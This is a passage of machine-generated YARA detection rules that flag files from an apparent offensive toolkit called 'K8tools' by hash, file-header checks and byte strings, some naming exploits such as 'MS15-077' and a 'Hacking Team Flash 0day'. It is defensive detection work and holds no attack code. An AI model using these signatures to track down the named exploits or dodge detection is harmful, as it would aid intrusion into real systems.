      hash2 = "63c82a60db232c03ba5cc6f0392c159cf3bfa456afb28eca994a95b298ee50b4"
   strings:
      $s1 = "8T@bOI&rc" fullword ascii /* score: '1.00'*/
      $s2 = "\"]2V-;Xm" fullword ascii /* score: '1.00'*/
      $s3 = "tED@I@" fullword ascii /* score: '1.00'*/
      $s4 = "7nW*}l" fullword ascii /* score: '1.00'*/
      $s5 = "&AKtLs" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x6152 and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _README_index_51 {
   meta:
      description = "K8tools - from files README.md, index"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c5535c5de8eeeff5f9e3fa680ea2edf1525ac93f41d5401dba91b8beeeaf0a85"
      hash2 = "c807ca03d90a379c4fb86feccf2a544d2a195c8d0e8189e67de798f965d37aeb"
   strings:
      $s1 = "MS15-077" fullword ascii /* score: '5.00'*/
      $s2 = "]Hacking Team Flash 0day" fullword ascii /* score: '4.00'*/
      $s3 = "20170114(" fullword ascii /* score: '1.00'*/
      $s4 = "ws2help" fullword ascii /* score: '1.00'*/
      $s5 = "6.0.2.614" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x4944 or uint16(0) == 0x2023 ) and filesize < 50KB and ( all of them )
      ) or ( all of them )
}

rule _index_pack_452140a6431f7359982ee68eebedb945f6b1726b_52 {
   meta:
      description = "K8tools - from files index, pack-452140a6431f7359982ee68eebedb945f6b1726b.idx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c807ca03d90a379c4fb86feccf2a544d2a195c8d0e8189e67de798f965d37aeb"
      hash2 = "cda8096049545f84f6cba71e584d93fd9a1c06fa6bd9fe636c7377bd01b9eee1"
   strings:
      $s1 = "pmRZtUm" fullword ascii /* score: '4.00'*/
      $s2 = "ejEM2-" fullword ascii /* score: '1.00'*/
      $s3 = "//&}hq(" fullword ascii /* score: '1.00'*/
      $s4 = "np+Z%:oT" fullword ascii /* score: '1.00'*/
      $s5 = "_e\"1(N.?" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x4944 or uint16(0) == 0x74ff ) and filesize < 90KB and ( all of them )
      ) or ( all of them )
}

